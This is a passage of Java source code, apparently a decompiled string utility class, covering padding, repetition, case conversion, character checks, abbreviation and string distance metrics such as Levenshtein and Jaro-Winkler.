    public static String repeat(String str, int repeat)
    {
        if (str == null)
        {
            return null;
        } else if (repeat <= 0)
        {
            return "";
        } else
        {
            int inputLength = str.length();
            if (repeat != 1 && inputLength != 0)
            {
                if (inputLength == 1 && repeat <= 8192)
                {
                    return repeat(str.charAt(0), repeat);
                } else
                {
                    int outputLength = inputLength * repeat;
                    switch (inputLength)
                    {
                        case 1:
                            return repeat(str.charAt(0), repeat);
                        case 2:
                            char ch0 = str.charAt(0);
                            char ch1 = str.charAt(1);
                            char[] output2 = new char[outputLength];

                            for (int i = repeat * 2 - 2; i >= 0; --i)
                            {
                                output2[i] = ch0;
                                output2[i + 1] = ch1;
                                --i;
                            }

                            return new String(output2);
                        default:
                            StringBuilder buf = new StringBuilder(outputLength);

                            for (int i = 0; i < repeat; ++i)
                            {
                                buf.append(str);
                            }

                            return buf.toString();
                    }
                }
            } else
            {
                return str;
            }
        }
    }


    public static String repeat(char ch, int repeat)
    {
        char[] buf = new char[repeat];

        for (int i = repeat - 1; i >= 0; --i)
        {
            buf[i] = ch;
        }

        return new String(buf);
    }

    public static String rightPad(String str, int size)
    {
        return rightPad(str, size, ' ');
    }

    public static String rightPad(String str, int size, char padChar)
    {
        if (str == null)
        {
            return null;
        } else
        {
            int pads = size - str.length();
            if (pads <= 0)
            {
                return str;
            } else
            {
                return pads > 8192 ? rightPad(str, size, String.valueOf(padChar)) : str.concat(repeat(padChar, pads));
            }
        }
    }

    public static String rightPad(String str, int size, String padStr)
    {
        if (str == null)
        {
            return null;
        } else
        {
            if (isEmpty(padStr))
            {
                padStr = " ";
            }

            int padLen = padStr.length();
            int strLen = str.length();
            int pads = size - strLen;
            if (pads <= 0)
            {
                return str;
            } else if (padLen == 1 && pads <= 8192)
            {
                return rightPad(str, size, padStr.charAt(0));
            } else if (pads == padLen)
            {
                return str.concat(padStr);
            } else if (pads < padLen)
            {
                return str.concat(padStr.substring(0, pads));
            } else
            {
                char[] padding = new char[pads];
                char[] padChars = padStr.toCharArray();

                for (int i = 0; i < pads; ++i)
                {
                    padding[i] = padChars[i % padLen];
                }

                return str.concat(new String(padding));
            }
        }
    }

    public static String leftPad(String str, int size)
    {
        return leftPad(str, size, ' ');
    }

    public static String leftPad(String str, int size, char padChar)
    {
        if (str == null)
        {
            return null;
        } else
        {
            int pads = size - str.length();
            if (pads <= 0)
            {
                return str;
            } else
            {
                return pads > 8192 ? leftPad(str, size, String.valueOf(padChar)) : repeat(padChar, pads).concat(str);
            }
        }
    }

    public static String leftPad(String str, int size, String padStr)
    {
        if (str == null)
        {
            return null;
        } else
        {
            if (isEmpty(padStr))
            {
                padStr = " ";
            }

            int padLen = padStr.length();
            int strLen = str.length();
            int pads = size - strLen;
            if (pads <= 0)
            {
                return str;
            } else if (padLen == 1 && pads <= 8192)
            {
                return leftPad(str, size, padStr.charAt(0));
            } else if (pads == padLen)
            {
                return padStr.concat(str);
            } else if (pads < padLen)
            {
                return padStr.substring(0, pads).concat(str);
            } else
            {
                char[] padding = new char[pads];
                char[] padChars = padStr.toCharArray();

                for (int i = 0; i < pads; ++i)
                {
                    padding[i] = padChars[i % padLen];
                }

                return (new String(padding)).concat(str);
            }
        }
    }

    public static int length(CharSequence cs)
    {
        return cs == null ? 0 : cs.length();
    }

    public static String center(String str, int size)
    {
        return center(str, size, ' ');
    }

    public static String center(String str, int size, char padChar)
    {
        if (str != null && size > 0)
        {
            int strLen = str.length();
            int pads = size - strLen;
            if (pads <= 0)
            {
                return str;
            } else
            {
                str = leftPad(str, strLen + pads / 2, padChar);
                str = rightPad(str, size, padChar);
                return str;
            }
        } else
        {
            return str;
        }
    }

    public static String center(String str, int size, String padStr)
    {
        if (str != null && size > 0)
        {
            if (isEmpty(padStr))
            {
                padStr = " ";
            }

            int strLen = str.length();
            int pads = size - strLen;
            if (pads <= 0)
            {
                return str;
            } else
            {
                str = leftPad(str, strLen + pads / 2, padStr);
                str = rightPad(str, size, padStr);
                return str;
            }
        } else
        {
            return str;
        }
    }

    public static String upperCase(String str)
    {
        return str == null ? null : str.toUpperCase();
    }

    public static String upperCase(String str, Locale locale)
    {
        return str == null ? null : str.toUpperCase(locale);
    }

    public static String lowerCase(String str)
    {
        return str == null ? null : str.toLowerCase();
    }

    public static String lowerCase(String str, Locale locale)
    {
        return str == null ? null : str.toLowerCase(locale);
    }

    public static String capitalize(String str)
    {
        int strLen;
        if (str != null && (strLen = str.length()) != 0)
        {
            char firstChar = str.charAt(0);
            return Character.isTitleCase(firstChar) ? str : (new StringBuilder(strLen)).append(Character.toTitleCase(firstChar)).append(str.substring(1)).toString();
        } else
        {
            return str;
        }
    }

    public static String uncapitalize(String str)
    {
        int strLen;
        if (str != null && (strLen = str.length()) != 0)
        {
            char firstChar = str.charAt(0);
            return Character.isLowerCase(firstChar) ? str : (new StringBuilder(strLen)).append(Character.toLowerCase(firstChar)).append(str.substring(1)).toString();
        } else
        {
            return str;
        }
    }

    public static String swapCase(String str)
    {
        if (isEmpty(str))
        {
            return str;
        } else
        {
            char[] buffer = str.toCharArray();

            for (int i = 0; i < buffer.length; ++i)
            {
                char ch = buffer[i];
                if (Character.isUpperCase(ch))
                {
                    buffer[i] = Character.toLowerCase(ch);
                } else if (Character.isTitleCase(ch))
                {
                    buffer[i] = Character.toLowerCase(ch);
                } else if (Character.isLowerCase(ch))
                {
                    buffer[i] = Character.toUpperCase(ch);
                }
            }

            return new String(buffer);
        }
    }

    public static int countMatches(CharSequence str, char ch)
    {
        if (isEmpty(str))
        {
            return 0;
        } else
        {
            int count = 0;

            for (int i = 0; i < str.length(); ++i)
            {
                if (ch == str.charAt(i))
                {
                    ++count;
                }
            }

            return count;
        }
    }

    public static boolean isAlpha(CharSequence cs)
    {
        if (isEmpty(cs))
        {
            return false;
        } else
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isLetter(cs.charAt(i)))
                {
                    return false;
                }
            }

            return true;
        }
    }

    public static boolean isAlphaSpace(CharSequence cs)
    {
        if (cs == null)
        {
            return false;
        } else
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isLetter(cs.charAt(i)) && cs.charAt(i) != ' ')
                {
                    return false;
                }
            }

            return true;
        }
    }

    public static boolean isAlphanumeric(CharSequence cs)
    {
        if (isEmpty(cs))
        {
            return false;
        } else
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isLetterOrDigit(cs.charAt(i)))
                {
                    return false;
                }
            }

            return true;
        }
    }

    public static boolean isAlphanumericSpace(CharSequence cs)
    {
        if (cs == null)
        {
            return false;
        } else
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isLetterOrDigit(cs.charAt(i)) && cs.charAt(i) != ' ')
                {
                    return false;
                }
            }

            return true;
        }
    }

    public static boolean isAsciiPrintable(CharSequence cs)
    {
        if (cs == null)
        {
            return false;
        } else
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!CharUtils.isAsciiPrintable(cs.charAt(i)))
                {
                    return false;
                }
            }

            return true;
        }
    }

    public static boolean isNumeric(CharSequence cs)
    {
        if (isEmpty(cs))
        {
            return false;
        } else
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isDigit(cs.charAt(i)))
                {
                    return false;
                }
            }

            return true;
        }
    }

    public static boolean isNumericSpace(CharSequence cs)
    {
        if (cs == null)
        {
            return false;
        } else
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isDigit(cs.charAt(i)) && cs.charAt(i) != ' ')
                {
                    return false;
                }
            }

            return true;
        }
    }

    public static boolean isWhitespace(CharSequence cs)
    {
        if (cs == null)
        {
            return false;
        } else
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isWhitespace(cs.charAt(i)))
                {
                    return false;
                }
            }

            return true;
        }
    }

    public static boolean isAllLowerCase(CharSequence cs)
    {
        if (cs != null && !isEmpty(cs))
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isLowerCase(cs.charAt(i)))
                {
                    return false;
                }
            }

            return true;
        } else
        {
            return false;
        }
    }

    public static boolean isAllUpperCase(CharSequence cs)
    {
        if (cs != null && !isEmpty(cs))
        {
            int sz = cs.length();

            for (int i = 0; i < sz; ++i)
            {
                if (!Character.isUpperCase(cs.charAt(i)))
                {
                    return false;
                }
            }

            return true;
        } else
        {
            return false;
        }
    }

    public static String defaultString(String str)
    {
        return str == null ? "" : str;
    }

    public static String defaultString(String str, String defaultStr)
    {
        return str == null ? defaultStr : str;
    }

    public static <T extends CharSequence> T defaultIfBlank(T str, T defaultStr)
    {
        return isBlank(str) ? defaultStr : str;
    }

    public static <T extends CharSequence> T defaultIfEmpty(T str, T defaultStr)
    {
        return isEmpty(str) ? defaultStr : str;
    }

    public static String reverse(String str)
    {
        return str == null ? null : (new StringBuilder(str)).reverse().toString();
    }

    public static String reverseDelimited(String str, char separatorChar)
    {
        if (str == null)
        {
            return null;
        } else
        {
            String[] strs = split(str, separatorChar);
            ArrayUtils.reverse(strs);
            return join((Object[]) strs, separatorChar);
        }
    }

    public static String abbreviate(String str, int maxWidth)
    {
        return abbreviate(str, 0, maxWidth);
    }

    public static String abbreviate(String str, int offset, int maxWidth)
    {
        if (str == null)
        {
            return null;
        } else if (maxWidth < 4)
        {
            throw new IllegalArgumentException("Minimum abbreviation width is 4");
        } else if (str.length() <= maxWidth)
        {
            return str;
        } else
        {
            if (offset > str.length())
            {
                offset = str.length();
            }

            if (str.length() - offset < maxWidth - 3)
            {
                offset = str.length() - (maxWidth - 3);
            }

            String abrevMarker = "...";
            if (offset <= 4)
            {
                return str.substring(0, maxWidth - 3) + "...";
            } else if (maxWidth < 7)
            {
                throw new IllegalArgumentException("Minimum abbreviation width with offset is 7");
            } else
            {
                return offset + maxWidth - 3 < str.length() ? "..." + abbreviate(str.substring(offset), maxWidth - 3) : "..." + str.substring(str.length() - (maxWidth - 3));
            }
        }
    }

    public static String abbreviateMiddle(String str, String middle, int length)
    {
        if (!isEmpty(str) && !isEmpty(middle))
        {
            if (length < str.length() && length >= middle.length() + 2)
            {
                int targetSting = length - middle.length();
                int startOffset = targetSting / 2 + targetSting % 2;
                int endOffset = str.length() - targetSting / 2;
                StringBuilder builder = new StringBuilder(length);
                builder.append(str.substring(0, startOffset));
                builder.append(middle);
                builder.append(str.substring(endOffset));
                return builder.toString();
            } else
            {
                return str;
            }
        } else
        {
            return str;
        }
    }

    public static String difference(String str1, String str2)
    {
        if (str1 == null)
        {
            return str2;
        } else if (str2 == null)
        {
            return str1;
        } else
        {
            int at = indexOfDifference(str1, str2);
            return at == -1 ? "" : str2.substring(at);
        }
    }

    public static int indexOfDifference(CharSequence cs1, CharSequence cs2)
    {
        if (cs1 == cs2)
        {
            return -1;
        } else if (cs1 != null && cs2 != null)
        {
            int i;
            for (i = 0; i < cs1.length() && i < cs2.length() && cs1.charAt(i) == cs2.charAt(i); ++i)
            {
            }

            return i >= cs2.length() && i >= cs1.length() ? -1 : i;
        } else
        {
            return 0;
        }
    }

    public static int indexOfDifference(CharSequence... css)
    {
        if (css != null && css.length > 1)
        {
            boolean anyStringNull = false;
            boolean allStringsNull = true;
            int arrayLen = css.length;
            int shortestStrLen = 2147483647;
            int longestStrLen = 0;

            int firstDiff;
            for (firstDiff = 0; firstDiff < arrayLen; ++firstDiff)
            {
                if (css[firstDiff] == null)
                {
                    anyStringNull = true;
                    shortestStrLen = 0;
                } else
                {
                    allStringsNull = false;
                    shortestStrLen = Math.min(css[firstDiff].length(), shortestStrLen);
                    longestStrLen = Math.max(css[firstDiff].length(), longestStrLen);
                }
            }

            if (allStringsNull || longestStrLen == 0 && !anyStringNull)
            {
                return -1;
            } else if (shortestStrLen == 0)
            {
                return 0;
            } else
            {
                firstDiff = -1;

                for (int stringPos = 0; stringPos < shortestStrLen; ++stringPos)
                {
                    char comparisonChar = css[0].charAt(stringPos);

                    for (int arrayPos = 1; arrayPos < arrayLen; ++arrayPos)
                    {
                        if (css[arrayPos].charAt(stringPos) != comparisonChar)
                        {
                            firstDiff = stringPos;
                            break;
                        }
                    }

                    if (firstDiff != -1)
                    {
                        break;
                    }
                }

                return firstDiff == -1 && shortestStrLen != longestStrLen ? shortestStrLen : firstDiff;
            }
        } else
        {
            return -1;
        }
    }

    public static String getCommonPrefix(String... strs)
    {
        if (strs != null && strs.length != 0)
        {
            int smallestIndexOfDiff = indexOfDifference(strs);
            if (smallestIndexOfDiff == -1)
            {
                return strs[0] == null ? "" : strs[0];
            } else
            {
                return smallestIndexOfDiff == 0 ? "" : strs[0].substring(0, smallestIndexOfDiff);
            }
        } else
        {
            return "";
        }
    }

    public static int getLevenshteinDistance(CharSequence s, CharSequence t)
    {
        if (s != null && t != null)
        {
            int n = s.length();
            int m = t.length();
            if (n == 0)
            {
                return m;
            } else if (m == 0)
            {
                return n;
            } else
            {
                if (n > m)
                {
                    CharSequence tmp = s;
                    s = t;
                    t = tmp;
                    n = m;
                    m = tmp.length();
                }

                int[] p = new int[n + 1];
                int[] d = new int[n + 1];

                int i;
                for (i = 0; i <= n; p[i] = i++)
                {
                }

                for (int j = 1; j <= m; ++j)
                {
                    char t_j = t.charAt(j - 1);
                    d[0] = j;

                    for (i = 1; i <= n; ++i)
                    {
                        int cost = s.charAt(i - 1) == t_j ? 0 : 1;
                        d[i] = Math.min(Math.min(d[i - 1] + 1, p[i] + 1), p[i - 1] + cost);
                    }

                    int[] _d = p;
                    p = d;
                    d = _d;
                }

                return p[n];
            }
        } else
        {
            throw new IllegalArgumentException("Strings must not be null");
        }
    }

    public static int getLevenshteinDistance(CharSequence s, CharSequence t, int threshold)
    {
        if (s != null && t != null)
        {
            if (threshold < 0)
            {
                throw new IllegalArgumentException("Threshold must not be negative");
            } else
            {
                int n = s.length();
                int m = t.length();
                if (n == 0)
                {
                    return m <= threshold ? m : -1;
                } else if (m == 0)
                {
                    return n <= threshold ? n : -1;
                } else
                {
                    if (n > m)
                    {
                        CharSequence tmp = s;
                        s = t;
                        t = tmp;
                        n = m;
                        m = tmp.length();
                    }

                    int[] p = new int[n + 1];
                    int[] d = new int[n + 1];
                    int boundary = Math.min(n, threshold) + 1;

                    int j;
                    for (j = 0; j < boundary; p[j] = j++)
                    {
                    }

                    Arrays.fill(p, boundary, p.length, 2147483647);
                    Arrays.fill(d, 2147483647);

                    for (j = 1; j <= m; ++j)
                    {
                        char t_j = t.charAt(j - 1);
                        d[0] = j;
                        int min = Math.max(1, j - threshold);
                        int max = j > 2147483647 - threshold ? n : Math.min(n, j + threshold);
                        if (min > max)
                        {
                            return -1;
                        }

                        if (min > 1)
                        {
                            d[min - 1] = 2147483647;
                        }

                        for (int i = min; i <= max; ++i)
                        {
                            if (s.charAt(i - 1) == t_j)
                            {
                                d[i] = p[i - 1];
                            } else
                            {
                                d[i] = 1 + Math.min(Math.min(d[i - 1], p[i]), p[i - 1]);
                            }
                        }

                        int[] _d = p;
                        p = d;
                        d = _d;
                    }

                    if (p[n] <= threshold)
                    {
                        return p[n];
                    } else
                    {
                        return -1;
                    }
                }
            }
        } else
        {
            throw new IllegalArgumentException("Strings must not be null");
        }
    }

    public static double getJaroWinklerDistance(CharSequence first, CharSequence second)
    {
        double DEFAULT_SCALING_FACTOR = 0.1D;
        if (first != null && second != null)
        {
            double jaro = score(first, second);
            int cl = commonPrefixLength(first, second);
            double matchScore = (double) Math.round((jaro + 0.1D * (double) cl * (1.0D - jaro)) * 100.0D) / 100.0D;
            return matchScore;
        } else
        {
            throw new IllegalArgumentException("Strings must not be null");
        }
    }

    private static double score(CharSequence first, CharSequence second)
    {
        String shorter;
        String longer;
        if (first.length() > second.length())
        {
            longer = first.toString().toLowerCase();
            shorter = second.toString().toLowerCase();
        } else
        {
            longer = second.toString().toLowerCase();
            shorter = first.toString().toLowerCase();
        }

        int halflength = shorter.length() / 2 + 1;
        String m1 = getSetOfMatchingCharacterWithin(shorter, longer, halflength);
        String m2 = getSetOfMatchingCharacterWithin(longer, shorter, halflength);
        if (m1.length() != 0 && m2.length() != 0)
        {
            if (m1.length() != m2.length())
            {
                return 0.0D;
            } else
            {
                int transpositions = transpositions(m1, m2);
                double dist = ((double) m1.length() / (double) shorter.length() + (double) m2.length() / (double) longer.length() + (double) (m1.length() - transpositions) / (double) m1.length()) / 3.0D;
                return dist;
            }
        } else
        {
            return 0.0D;
        }
    }

    public static int getFuzzyDistance(CharSequence term, CharSequence query, Locale locale)
    {
        if (term != null && query != null)
        {
            if (locale == null)
            {
                throw new IllegalArgumentException("Locale must not be null");
            } else
            {
                String termLowerCase = term.toString().toLowerCase(locale);
                String queryLowerCase = query.toString().toLowerCase(locale);
                int score = 0;
                int termIndex = 0;
                int previousMatchingCharacterIndex = -2147483648;

                for (int queryIndex = 0; queryIndex < queryLowerCase.length(); ++queryIndex)
                {
                    char queryChar = queryLowerCase.charAt(queryIndex);

                    for (boolean termCharacterMatchFound = false; termIndex < termLowerCase.length() && !termCharacterMatchFound; ++termIndex)
                    {
                        char termChar = termLowerCase.charAt(termIndex);
                        if (queryChar == termChar)
                        {
                            ++score;
                            if (previousMatchingCharacterIndex + 1 == termIndex)
                            {
                                score += 2;
                            }

                            previousMatchingCharacterIndex = termIndex;
                            termCharacterMatchFound = true;
                        }
                    }
                }

                return score;
            }
        } else
        {
            throw new IllegalArgumentException("Strings must not be null");
        }
    }

    private static String getSetOfMatchingCharacterWithin(CharSequence first, CharSequence second, int limit)
    {
        StringBuilder common = new StringBuilder();
        StringBuilder copy = new StringBuilder(second);

        for (int i = 0; i < first.length(); ++i)
        {
            char ch = first.charAt(i);
            boolean found = false;

            for (int j = Math.max(0, i - limit); !found && j < Math.min(i + limit, second.length()); ++j)
            {
                if (copy.charAt(j) == ch)
                {
                    found = true;
                    common.append(ch);
                    copy.setCharAt(j, '*');
                }
            }
        }

        return common.toString();
    }

    private static int transpositions(CharSequence first, CharSequence second)
    {
        int transpositions = 0;

        for (int i = 0; i < first.length(); ++i)
        {
            if (first.charAt(i) != second.charAt(i))
            {
                ++transpositions;
            }
        }

        return transpositions / 2;
    }

    private static int commonPrefixLength(CharSequence first, CharSequence second)
    {
        int result = getCommonPrefix(first.toString(), second.toString()).length();
        return result > 4 ? 4 : result;
    }


    public static String normalizeSpace(String str)
    {
        if (isEmpty(str))
        {
            return str;
        } else
        {
            int size = str.length();
            char[] newChars = new char[size];
            int count = 0;
            int whitespacesCount = 0;
            boolean startWhitespaces = true;

            for (int i = 0; i < size; ++i)
            {
                char actualChar = str.charAt(i);
                boolean isWhitespace = Character.isWhitespace(actualChar);
                if (!isWhitespace)
                {
                    startWhitespaces = false;
                    newChars[count++] = actualChar == 160 ? 32 : actualChar;
                    whitespacesCount = 0;
                } else
                {
                    if (whitespacesCount == 0 && !startWhitespaces)
                    {
                        newChars[count++] = " ".charAt(0);
                    }

                    ++whitespacesCount;
                }
            }

            if (startWhitespaces)
            {
                return "";
            } else
            {
                return new String(newChars, 0, count - (whitespacesCount > 0 ? 1 : 0));
            }
        }
    }


    /**
     * @deprecated
     */
    @Deprecated
    public static String toString(byte[] bytes, String charsetName) throws UnsupportedEncodingException
    {
        return charsetName != null ? new String(bytes, charsetName) : new String(bytes, Charset.defaultCharset());
    }

    public static String toEncodedString(byte[] bytes, Charset charset)
    {
        return new String(bytes, charset != null ? charset : Charset.defaultCharset());
    }

    public static String wrap(String str, char wrapWith)
    {
        return !isEmpty(str) && wrapWith != 0 ? wrapWith + str + wrapWith : str;
    }

    public static String wrap(String str, String wrapWith)
    {
        return !isEmpty(str) && !isEmpty(wrapWith) ? wrapWith.concat(str).concat(wrapWith) : str;
    }
}

